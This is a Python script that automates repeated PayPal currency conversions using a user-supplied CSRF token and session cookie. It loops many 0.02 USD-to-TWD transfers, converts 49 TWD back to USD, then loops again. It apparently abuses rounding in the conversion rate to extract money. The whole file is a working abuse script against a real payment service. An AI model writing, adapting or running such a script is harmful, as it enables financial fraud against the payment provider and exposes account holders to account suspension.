import requests,time 
csrf = input("Input csrf: ")
cookie = input("Input cookie: ")
#corrykalam euy
for a in range(48):
    headers = {
        'authority': 'www.paypal.com',
        'accept': 'application/json',
        'x-requested-with': 'XMLHttpRequest',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36',
        'content-type': 'application/json',
        'origin': 'https://www.paypal.com',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'referer': 'https://www.paypal.com/myaccount/money/currencies/USD/transfer/TWD/review',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'cookie': cookie,
    }

    data = '{"sourceCurrency":"USD","sourceAmount":0.02,"targetCurrency":"TWD","_csrf":"%s"}'%(csrf)

    response = requests.post('https://www.paypal.com/myaccount/money/api/currencies/transfer', headers=headers, data=data)
    if "convertCurrency" in response.text:
        print("Success exchange!")
    else:
        print("Failed exchange!")
    time.sleep(1)
headers = {
    'authority': 'www.paypal.com',
    'accept': 'application/json',
    'x-requested-with': 'XMLHttpRequest',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36',
    'content-type': 'application/json',
    'origin': 'https://www.paypal.com',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'referer': 'https://www.paypal.com/myaccount/money/currencies/TWD/transfer/USD/review',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'en-US,en;q=0.9',
    'cookie': cookie,
}

data = '{"sourceCurrency":"TWD","sourceAmount":49,"targetCurrency":"USD","_csrf":"%s"}'%(csrf)

response = requests.post('https://www.paypal.com/myaccount/money/api/currencies/transfer', headers=headers, data=data)
if "convertCurrency" in response.text:
    print("Success exchange back!")
else:
    print("Failed exchange back!")
time.sleep(1)
for a in range(35):
    headers = {
        'authority': 'www.paypal.com',
        'accept': 'application/json',
        'x-requested-with': 'XMLHttpRequest',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36',
        'content-type': 'application/json',
        'origin': 'https://www.paypal.com',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'referer': 'https://www.paypal.com/myaccount/money/currencies/USD/transfer/TWD/review',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'cookie': cookie,
    }

    data = '{"sourceCurrency":"USD","sourceAmount":0.02,"targetCurrency":"TWD","_csrf":"%s"}'%(csrf)

    response = requests.post('https://www.paypal.com/myaccount/money/api/currencies/transfer', headers=headers, data=data)
    if "convertCurrency" in response.text:
        print("Success exchange!")
    else:
        print("Failed exchange!")
    time.sleep(1)
